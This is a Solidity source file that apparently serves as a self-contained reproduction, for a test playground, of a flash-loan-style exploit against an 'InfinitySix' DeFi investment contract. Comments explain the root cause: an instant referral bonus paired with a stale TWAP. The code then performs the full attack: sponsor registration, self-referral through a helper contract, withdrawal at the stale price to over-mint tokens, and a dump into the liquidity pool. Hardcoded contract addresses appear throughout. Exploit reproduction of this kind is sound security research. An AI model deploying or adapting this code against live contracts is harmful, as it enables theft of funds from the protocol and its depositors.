// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

// Synthetic standalone exploit for the EVM Playground (2026-03-InfinitySix).
// The registry Foundry test (test/InfinitySix_exp.sol) runs the attack INLINE
// on the test contract with `deal(USDT, …)` as flash-loan capital. This is a
// self-contained copy: capital is dealt into this contract via setup.dealToken
// before run(); the attack body mirrors the test exactly.
//
// Root cause: invest() instantly credits referrer.directBonus = 5% of the invest
// amount (no cooldown). withdraw() converts that USDT-denominated bonus into i6
// at twapPrice, but updateTwap() refuses to refresh more than once per minute —
// so same-tx invest+withdraw settles at the pre-attack TWAP while the LP spot
// has already been flooded by the referral invest.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

interface IInfinitySix {
    function invest(uint256 usdtAmount, address referrer, uint256 minTokensOut) external;
    function withdraw() external;
    function twapPrice() external view returns (uint256);
}

interface IUniswapV2Router02 {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

// Disposable referral wallet so invest() can take a different msg.sender as the "downline".
contract InfinitySixReferralHelper {
    function invest(address infinity, address usdt, address sponsor, uint256 amount) external {
        IERC20(usdt).approve(infinity, amount);
        IInfinitySix(infinity).invest(amount, sponsor, 0);
    }
}

contract InfinitySixDrain {
    address constant INFINITY = 0x1cb36b0F1eFd9b738997DA3d5525364c7e82A18a;
    address constant USDT = 0x55d398326f99059fF775485246999027B3197955;
    address constant I6 = 0xd7684971AfE4C231fa9aF6B53e18eAF86438A0e6;
    address constant ROUTER = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    address constant GENESIS = 0xf86c0c3883878a55F6CF82C9daABC2E59ab6dcE3;

    // Real attack amounts (scaled so sponsor 7x cap ≈ 5% referral bonus).
    uint256 constant SPONSOR_INVEST = 885_815.60 ether;
    uint256 constant REFERRAL_INVEST = 124_014_184.40 ether;

    // Recorded attack. USDT capital is pre-dealt onto this contract via setup.
    function run() external {
        // 1) Register as sponsor under GENESIS — also records a TWAP observation
        //    at the pre-attack price (~1.05 USDT/i6).
        IERC20(USDT).approve(INFINITY, type(uint256).max);
        IInfinitySix(INFINITY).invest(SPONSOR_INVEST, GENESIS, 0);

        // 2) Self-referral via helper: 5% instant directBonus to this contract
        //    (~6.2M USDT) + LP spot skew from the huge invest.
        InfinitySixReferralHelper helper = new InfinitySixReferralHelper();
        require(IERC20(USDT).transfer(address(helper), REFERRAL_INVEST), "fund helper");
        helper.invest(INFINITY, USDT, address(this), REFERRAL_INVEST);

        // 3) Withdraw at stale TWAP → over-mint i6 from the project-token reserve.
        //    updateTwap() early-returns (same-minute floor); settlement uses ~1.05.
        IInfinitySix(INFINITY).withdraw();
        uint256 i6Got = IERC20(I6).balanceOf(address(this));
        require(i6Got > 1_000_000 ether, "expected multi-million i6 over-mint");

        // 4) Dump i6 into the USDT-flooded LP for profit.
        IERC20(I6).approve(ROUTER, type(uint256).max);
        address[] memory path = new address[](2);
        path[0] = I6;
        path[1] = USDT;
        IUniswapV2Router02(ROUTER).swapExactTokensForTokensSupportingFeeOnTransferTokens(
            i6Got, 0, path, address(this), block.timestamp
        );
    }
}
